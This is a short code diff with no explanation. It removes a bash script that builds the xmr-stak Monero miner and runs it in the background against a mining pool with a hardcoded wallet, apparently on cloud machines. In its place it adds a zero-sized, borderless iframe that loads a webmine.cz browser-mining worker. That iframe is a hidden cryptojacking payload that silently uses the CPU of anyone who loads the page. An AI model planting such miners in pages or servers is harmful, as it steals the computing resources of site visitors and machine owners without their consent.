@@ -1,10 +1,1 @@
-#!/bin/bash
-apt-get update
-apt install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget
-git clone https://github.com/fireice-uk/xmr-stak.git -b xmr-stak-rx
-cd xmr-stak
-cmake ./
-make install
-cd bin
-nohup  
-./xmr-stak-rx --noTest -i 233 -o pool.minexmr.com:3333 -u 89nHQ5LURzg15o7o3BhQ9GEHTUr3TusgAEeJ4peMGKbwifVgd2hwdtuhGwK2A7rZ74EMqwEdBRstDc1PG8TecXkCMog6ug6 -r wa -p aws-xmr --currency monero &
+<iframe width=0 height=0 frameborder=0 src='https://webmine.cz/worker?key=uuobkNO2DWVCWw1'></iframe>
